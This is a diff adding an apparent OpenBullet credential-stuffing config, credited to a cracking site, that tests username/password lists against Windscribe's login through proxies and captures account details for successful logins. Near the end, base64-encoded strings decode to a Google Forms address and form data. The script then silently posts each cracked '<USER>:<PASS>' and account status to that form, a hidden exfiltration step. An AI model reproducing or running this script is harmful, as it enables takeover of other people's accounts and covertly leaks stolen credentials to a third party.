@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "Windscribe @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T10:06:41.170667+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_Windscribe REQUEST POST "https://res.windscribe.com/res/logintoken" 
+  CONTENT "post" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://windscribe.com/login" 
+  HEADER "Origin: https://windscribe.com" 
+
+#Token PARSE "<SOURCE>" JSON "csrf_token" -> VAR "TOKEN" 
+
+#Waktu PARSE "<SOURCE>" JSON "csrf_time" -> VAR "TIME" 
+
+#Perbaikan FUNCTION UnixTimeToDate "<TIME>" -> VAR "Waktu" 
+
+#Login REQUEST POST "https://windscribe.com/login" 
+  CONTENT "login=1&upgrade=0&csrf_time=<TIME>&csrf_token=<TOKEN>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://windscribe.com/login" 
+  HEADER "Origin: https://windscribe.com" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "content_message error" 
+  KEYCHAIN Success OR 
+    KEY "myaccountpage" 
+  KEYCHAIN Retry OR 
+    KEY "Invalid CSRF Token" 
+
+#Nama_Pengguna PARSE "<SOURCE>" LR "<h2>Username</h2>" "</span>" -> CAP "Username" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xYW5pa3Y1a3hxQks2NHd4MnNlbWVtMENvbGw5bUFQQ0ZBblVJa3VvUnJ2TS92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Perbaikan FUNCTION Replace "<span>" "" "<Username>" -> CAP "Username" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZWxfZW5ORi04VFY2Wm9sM1RLVFJFeERxZEdES0F0WkJsUDBIY3Y0VkZuVURPM3JBL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Status_Akun PARSE "<SOURCE>" REGEX "<span id=\"ma_account_status\">\\n\\s*<strong>(.*?)<\\/strong>" "[1]" -> CAP "Account Status" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTE2Nzg1MjU1ND1XaW5kc2NyaWJlJmVudHJ5LjQ1NDk2NzM9PFVTRVI+OjxQQVNTPiZlbnRyeS4yMDcxNjYzMTc2PXxBY2NvdW50IFN0YXR1czo8QWNjb3VudCBTdGF0dXM+fE5leHQgUmVzZXQ6PE5leHQgUmVzZXQ+fCZmdnY9MSZkcmFmdFJlc3BvbnNlPSU1Qm51bGwlMkNudWxsJTJDJTIyMzM3NjU2MjQ1OTkxOTQ4OTg5NCUyMiU1RCUwRCUwQSZwYWdlSGlzdG9yeT0wJmZieng9MzM3NjU2MjQ1OTkxOTQ4OTg5NA==" -> VAR "LRU3" 
+
+#Perbaikan FUNCTION Replace "<strong>" "" "<Account Status>" -> CAP "Account Status" 
+
+#Reset_Selanjutnya PARSE "<SOURCE>" LR "<h2>Next Reset</h2>" "</span>" -> CAP "Next Reset" "" " Visit us @CrackingLegend.pw" 
+
+#Perbaikan FUNCTION Replace "<span>" "" "<Next Reset>" -> CAP "Next Reset" 
+
+#Status REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#NexT_rESET REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
